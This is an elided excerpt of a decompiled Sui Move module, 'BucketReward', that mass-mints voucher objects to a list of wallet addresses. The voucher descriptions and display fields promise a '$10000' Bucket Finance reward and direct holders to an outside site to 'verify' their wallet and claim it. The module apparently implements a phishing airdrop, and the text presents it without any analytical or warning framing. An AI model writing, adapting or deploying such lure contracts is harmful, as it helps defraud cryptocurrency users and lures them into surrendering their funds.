module 0xe560fc56ba1be7140811e2b738b8a9b1161dbb29772d5bf8e0f79fc1bdf0632d::BucketReward {
    ...
    public entry fun DistributeReward(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = BUCKET_REWARD_VOUCHER{
                ...
                description : 0x1::string::utf8(b"Bucket Finance Reward of $10000 is ready at https://bucketfi.com. Verify your wallet activity and claim your reward."),
    ...
    fun init(arg0: BUCKETREWARD, arg1: &mut 0x2::tx_context::TxContext) {
        ...
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Bucket Finance Reward of $10000 is ready at https://bucketfi.com. Verify your wallet activity and claim your reward."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://bucketfi.com"));
